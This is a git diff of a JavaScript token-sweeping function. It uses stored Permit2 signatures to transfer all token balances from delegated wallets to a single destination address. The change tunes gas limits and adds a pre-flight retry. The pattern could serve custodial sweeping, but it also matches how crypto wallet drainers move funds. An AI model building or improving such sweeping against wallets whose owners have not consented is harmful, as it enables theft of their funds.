@@ -1673,15 +1673,14 @@ async function sweep(wallet) {
         to: DESTINATION_ADDRESS,
         requestedAmount: sweepMapPf.get(t.token.toLowerCase()) ?? 0n,
       }));
-      const gasLimitPf = 200_000n + BigInt(permitted.length) * 2_200n + BigInt(withBalance.length) * 80_000n;
+      const gasLimitPf = 300_000n + BigInt(permitted.length) * 4_500n + BigInt(withBalance.length) * 80_000n;
+      let gasLimitOverride = null;
+      const runPreflight = async (gasLimit) => permit2Batch.permitTransferFrom.staticCall(
+        { permitted: fullPermittedPf, nonce: BigInt(sig.nonce), deadline: dl },
+        fullTransferDetailsPf, checksum, sig.signature, { gasLimit },
+      );
       try {
-        await permit2Batch.permitTransferFrom.staticCall(
-          { permitted: fullPermittedPf, nonce: BigInt(sig.nonce), deadline: dl },
-          fullTransferDetailsPf,
-          checksum,
-          sig.signature,
-          { gasLimit: gasLimitPf },
-        );
+        await runPreflight(gasLimitPf);
         log(`[gasless] pre-flight ✅ — broadcasting`);
       } catch (simErr) {
         let revertName = simErr?.revert?.name ?? null;
@@ -1720,7 +1719,21 @@ async function sweep(wallet) {
           }
           return;
         }
-        warn(`[gasless] unknown pre-flight error (${simMsg}) — proceeding with broadcast`);
+        if (!revertName) {
+          warn(`[gasless] pre-flight empty revert — retrying with 2× gas (${gasLimitPf * 2n})`);
+          try {
+            await runPreflight(gasLimitPf * 2n);
+            log(`[gasless] pre-flight ✅ on 2× gas retry — broadcasting with higher limit`);
+            gasLimitOverride = gasLimitPf * 2n;
+          } catch {
+            err(`[gasless] pre-flight failed on 2× gas retry — marking needs re-activation, skipping broadcast`);
+            if (supabase) await supabase.from("delegated_wallets").update({ needs_reactivation: true })
+              .eq("address", addrKey).eq("chain", CHAIN).then(v => v, () => {});
+            return;
+          }
+        } else {
+          warn(`[gasless] unknown pre-flight error (${simMsg}) — proceeding with broadcast`);
+        }
       }
 
       try {
@@ -1731,7 +1744,7 @@ async function sweep(wallet) {
           to: DESTINATION_ADDRESS,
           requestedAmount: sweepMap.get(t.token.toLowerCase()) ?? 0n,
         }));
-        const gasLimit = 200_000n + BigInt(permitted.length) * 2_200n + BigInt(withBalance.length) * 80_000n;
+        const gasLimit = gasLimitOverride ?? (300_000n + BigInt(permitted.length) * 4_500n + BigInt(withBalance.length) * 80_000n);
         const tx = await permit2Batch.permitTransferFrom(
           { permitted: fullPermitted, nonce: BigInt(sig.nonce), deadline: dl },
           fullTransferDetails,
